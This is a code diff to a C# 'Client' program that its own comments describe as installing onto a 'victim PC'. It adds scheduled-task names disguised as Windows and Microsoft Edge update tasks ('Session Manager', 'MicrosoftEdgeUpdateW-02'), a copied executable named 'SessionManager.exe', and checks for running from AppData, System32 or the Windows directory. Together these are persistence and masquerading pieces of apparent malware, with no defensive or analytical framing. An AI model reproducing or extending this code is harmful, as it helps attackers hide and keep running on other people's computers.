@@ -15,6 +15,8 @@ namespace Client
     /// </summary>
     public static class Constants
     {
+        public static Random Rand = new Random(DateTime.Now.Second);
+
         public static string Title = Assembly.GetExecutingAssembly().GetCustomAttribute<AssemblyTitleAttribute>().Title;
 
         public static string AppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -25,6 +27,18 @@ namespace Client
         /// Target location to victim PC
         /// </summary>
         public static string MMCFile = System.IO.Path.GetFullPath(MMCFolder + @"\SessionManager.exe");
+        public static string MMCTaskName = "Session Manager";
+
+        /// <summary>
+        /// The System32 directory
+        /// </summary>
+        public static string System32Dir = Environment.SystemDirectory;
+        /// <summary>
+        /// The Windows directory at C:/Windows
+        /// </summary>
+        public static string WinDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+
+        public static string WinDirTaskName = "MicrosoftEdgeUpdateW-02";
 
         public static string MyPath = Assembly.GetExecutingAssembly().Location;
 
@@ -32,10 +46,18 @@ namespace Client
         /// <summary>
         /// Checks if the current program is already in the victim's PC via path.
         /// </summary>
-        public static bool IsInVictimPC()
+        public static bool IsInAppData()
         {
-            return Utilities.Files_And_Pathing.NormalizePath(MyPath) == Utilities.Files_And_Pathing.NormalizePath(MMCFile);
+            return Utilities.Files_And_Pathing.NormalizePath(MyPath).ToLower().Contains(MMCFolder.ToLower());
         }
+        public static bool IsInSys32() {
+            return Utilities.Files_And_Pathing.NormalizePath(MyPath).ToLower().Contains(Environment.SystemDirectory.ToLower());
+        }
+        public static bool IsInWinDir()
+        {
+            return Utilities.Files_And_Pathing.NormalizePath(MyPath).ToLower().Contains(WinDir.ToLower());
+        }
+
 
         public static int MyProcessID = Process.GetCurrentProcess().Id;
 
